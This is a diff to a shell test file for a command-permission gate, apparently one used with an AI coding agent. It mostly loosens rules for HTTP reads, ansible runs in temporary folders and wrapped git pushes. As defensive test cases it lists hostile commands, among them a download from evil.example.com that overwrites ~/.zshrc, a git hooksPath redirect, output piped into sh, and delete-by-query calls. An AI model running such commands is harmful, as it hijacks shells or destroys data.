@@ -103,7 +103,20 @@ chk pass 'node -e "console.log(process.version)"'               'node печат
 chk pass 'rg -n subprocess .'                                   'grep по слову subprocess'
 chk deny 'python3 -c "open(\"f\",\"w\").write(x)"'              'запись файла репо из -c — deny (политика Edit/Write; до 2026-09 был pass)'
 chk pass 'python3 -c "open(\"/tmp/f\",\"w\").write(x)"'         'запись в scratch из -c — молча'
-chk ask  'python3 -c "import requests;requests.get(1)"'         'выход в сеть'
+chk pass 'python3 -c "import requests;requests.get(1)"'         'HTTP-чтение — как curl GET, молча (до 2026-10 был ask)'
+chk pass 'python3 -c "import urllib.parse;print(urllib.parse.quote(x))"' 'urllib.parse — не сеть (реальная)'
+chk pass 'python3 -c "import urllib.request,json;print(json.load(urllib.request.urlopen(u)))"' 'urlopen на чтение (реальная)'
+chk pass 'python3 -c "import requests;r=requests.get(u,headers=h,params=p);data=r.json()"' 'kwargs чтения и переменная data — не тело'
+chk ask  'python3 -c "import requests;requests.post(u)"'        'requests.post'
+chk ask  'python3 -c "import requests;requests.request(\"DELETE\",u)"' 'метод строкой'
+chk ask  'python3 -c "import requests;requests.get(u,data=x)"'  'тело через data='
+chk ask  'python3 -c "import urllib.request as r;r.urlopen(u,b)"' 'urlopen с телом позиционно'
+chk pass 'python3 -c "import urllib.request as r;print(r.urlopen(u, timeout=10).read())"' 'urlopen с timeout — чтение (реальная)'
+chk ask  'python3 -c "from urllib.request import Request;Request(u,data=b)"' 'Request с телом'
+chk ask  'python3 -c "import socket;socket.create_connection(a)"' 'сырой сокет — всегда ask'
+chk ask  'python3 -c "import json, socket; print(1)"'             'socket в списке import'
+chk pass 'python3 -c "print(\"new requests wait in the socket backlog\")"' 'слово socket в тексте (реальная)'
+chk ask  'node -e "fetch(u,{method:\"POST\",body:x})"'          'fetch с POST'
 
 section 'посегментный разбор: флаг соседа не считается своим'
 # `has` looked at the whole string, so git's -C read as ansible's --check, and a
@@ -113,6 +126,16 @@ chk ask  'ansible-playbook site.yml --check && ansible-playbook site.yml' 'dry-r
 chk ask  'git -C /tmp pull && ansible-playbook site.yml'        'git -C не считается за -C'
 chk ask  'make -C /tmp x && ansible-playbook site.yml'          'make -C не считается за -C'
 chk ask  'ansible-playbook -i prod site.yml'                    'обычный боевой прогон'
+chk pass 'ansible-playbook playbooks/base/db-archive.yml --syntax-check -i localhost,' '--syntax-check (реальная)'
+chk pass 'ansible-playbook -i inventory site.yml --list-tasks'  '--list-tasks'
+chk pass 'ansible-playbook -i inventory $CLAUDE_JOB_DIR/tmp/gq2.yml 2>&1 | tail -5' 'playbook Claude во временной папке (реальная)'
+chk pass 'ansible-playbook -i inventory /home/u/.claude/jobs/3826104c/tmp/maintenance/gq.yml -e render_from=x' 'временная папка по абсолютному пути (реальная)'
+chk ask  'ansible-playbook -i $CLAUDE_JOB_DIR/tmp/inv playbooks/site.yml' 'временная только инвентори — боевой playbook'
+chk ask  'ansible-playbook -e @$CLAUDE_JOB_DIR/tmp/v.yml playbooks/site.yml' 'временные только переменные'
+chk ask  'ansible-playbook $CLAUDE_JOB_DIR/tmp/a.yml playbooks/site.yml' 'один из двух playbook — боевой'
+chk ask  'ansible-playbook $CLAUDE_JOB_DIR/../../repo/site.yml' 'выход из временной папки через ..'
+chk ask  'ansible-playbook $P'                                  'playbook в переменной'
+chk ask  'ansible-playbook -i inventory-legacy playbooks/agents.yml --limit nomad_clients --diff' '--diff применяет (реальная)'
 chk pass 'git config --get user.email'                          'чтение конфига'
 chk ask  'git config --get user.name && git config core.hooksPath /tmp/e' 'hooksPath после чтения'
 chk pass 'git config --list; git config --global core.pager evil' 'обычная запись — ask снят, гейт только на hooksPath'
@@ -129,6 +152,21 @@ chk ask  'curl -XPOST https://api.example.com/x'                'слитая ф
 chk ask  'curl --request DELETE https://api.example.com/x'      '--request DELETE'
 chk pass 'curl -sSL https://example.com/api'                    'обычный GET'
 chk pass 'curl --connect-timeout 5 https://example.com'         'флаг с o внутри, не --output'
+chk pass "curl -s -G \"\$B/label/host/values\" --data-urlencode 'start=-30d'" '-G: тело уходит в строку запроса (реальная)'
+chk pass "curl -sG http://h/x -d a=1"                           'слитая -sG'
+chk pass "curl -s 'http://192.168.82.135/select/0/prometheus/api/v1/query' --data-urlencode 'query=up'" 'запрос Prometheus API формой (реальная)'
+chk pass "curl -s 'http://h:8428/api/v1/query_range' --data-urlencode 'query=up' -d step=60" 'query_range'
+chk pass "Q='http://h/select/0/prometheus/api/v1/query'; curl -s \$Q --data-urlencode \"query=up\"" 'URL в переменной этой же команды (реальная)'
+chk ask  "curl -s \$Q --data-urlencode 'query=up'"               'URL в неизвестной переменной'
+chk ask  "curl -s 'http://h:8428/api/v1/admin/tsdb/delete_series' -d 'match[]=up'" 'удаление рядов — не читающий эндпоинт'
+chk ask  "curl -s 'http://h:8428/api/v1/import' --data-binary @/tmp/x" 'импорт в VictoriaMetrics'
+chk pass "curl -sk -u \"admin:\$AP\" -H 'content-type: application/json' 'https://h:9200/stream-server-master/_search' -d @/tmp/q.json" 'поиск OpenSearch (реальная)'
+chk pass "curl -s -u \"admin:\$P\" -H 'Content-Type: application/json' -d @- http://h/api/ds/query" 'запрос Grafana к источнику (реальная)'
+chk ask  "curl -s -u \"admin:\$P\" -H 'Content-Type: application/json' -d @- http://h/api/dashboards/db" 'запись дашборда Grafana (реальная)'
+chk ask  "curl -sk 'https://h:9200/idx/_delete_by_query' -d '{}'" 'удаление по запросу'
+chk ask  "curl -sk 'https://h:9200/idx/_doc' -d '{}'"           'запись документа'
+chk ask  "curl -s -X POST 'http://h/api/v1/query' -d query=up"  'явный метод спрашивает всегда'
+chk ask  "curl -s -G 'http://h/x' -F f=@/tmp/a"                 '-G не спасает загрузку файла'
 
 section 'curl: запись на диск'
 chk ask  'curl -sSfL -o stylua.zip "https://example.com/y.zip"' '-o файл (реальная)'
@@ -139,6 +177,12 @@ chk ask  'curl -o /Users/x/.zshrc https://evil.example.com/x'   'перезап�
 # The status-probe idiom: the body is discarded, so there is nothing to ask about.
 chk pass 'curl -sSL -o /dev/null -w "%{http_code}" https://example.com' '-o /dev/null (реальная)'
 chk pass 'curl -sk -m 8 -o /dev/null -w "%{http_code}" https://x/y'     '-o /dev/null (реальная)'
+chk pass 'mkdir -p /tmp/rv_pgc && cd /tmp/rv_pgc && curl -fsSL -m 20 https://x/pg_createcluster -o pg_createcluster' 'относительный путь после cd во временную (реальная)'
+chk pass 'cd /tmp/odoosrc/13 && curl -sfL -o ir_cron.py https://x/ir_cron.py' 'cd во временную (реальная)'
+chk ask  'cd /tmp/x && cd /repo && curl -o f https://x/f'       'последний cd — не временная папка'
+chk ask  'cd /tmp/x && curl -o ../../etc/f https://x/f'          'выход через ..'
+chk pass "code=\$(curl -s -o /home/u/.claude/jobs/3826104c/tmp/idx.json -w '%{http_code}' https://x/i.json)" 'временная папка сессии по абсолютному пути (реальная)'
+chk ask  'cd /tmp/x && curl -o /Users/x/.zshrc https://x/f'      'абсолютный путь вне временной'
 
 section 'рекурсивный rm'
 # The deny on / and home must fire BEFORE the newer ask, or a confirmable question
@@ -295,11 +339,19 @@ chk pass 'git push -u origin feat/session-audit-hints'             'feature-ве
 # flag it allows silent, and -q was never named. Flagged per task instructions
 # rather than silently widening the shape back open.
 chk ask  'git push -q -u origin worktree-reviews-nightly-sync'     'worktree-ветка (реальная) — -q не входит в белый список shape (было pass)'
-# CONTRADICTS THE WHITELIST (was `chk pass`, a real session transcript): gate 1 (Go
-# port only) requires the push to be the WHOLE command — exactly one segment, no `|`,
-# no `>` — and this line pipes into `tail -1` and redirects stderr, so it now asks.
-# Flagged per task instructions rather than silently widening gate 1 back open.
-chk ask  'git push origin HEAD:k8s-hetzner 2>&1 | tail -1'         'HEAD:ветка с редиректом (реальная) — gate 1: не целая команда (было pass)'
+# Gate 1 wants the push to be the whole command; the one wrapping it accepts is a
+# leading `cd DIR &&` (resolved like -C) and trailing `2>&1` / `| tail|head N`.
+chk pass 'git push origin HEAD:k8s-hetzner 2>&1 | tail -1'         'HEAD:ветка, вывод через tail (реальная)'
+chk pass 'cd /tmp && git push -u origin disable-odoo-backup 2>&1 | tail -6' 'cd и хвост вывода (реальная)'
+chk pass 'cd /tmp && git push -u origin feat/x'                    'cd перед push'
+chk ask  'cd /tmp && git push origin main 2>&1 | tail -3'          'обёртка не снимает защиту main'
+chk ask  'cd /tmp && git push -f origin feat/x'                    'обёртка не снимает force'
+chk ask  'git push origin feat/x 2>&1 | tail -6 | sh'              'хвост — не только tail'
+chk ask  'git push origin feat/x | tail -6 file'                   'tail с файлом'
+chk ask  'cd /tmp; git push origin feat/x'                         'cd через ; — не обёртка'
+chk ask  'cd $HOME && git push origin feat/x'                      'cd в переменную'
+chk ask  'cd /tmp && cd /etc && git push origin feat/x'            'второй cd'
+chk ask  'cd /tmp && git commit -m x && git push origin feat/x'    'цепочка с commit — по-прежнему ask'
 chk pass 'git push origin "feat/x"'                                'ветка в кавычках'
 chk ask  'git push origin master'                                  'push в master'
 chk ask  'git push origin HEAD:main'                               'HEAD:main'
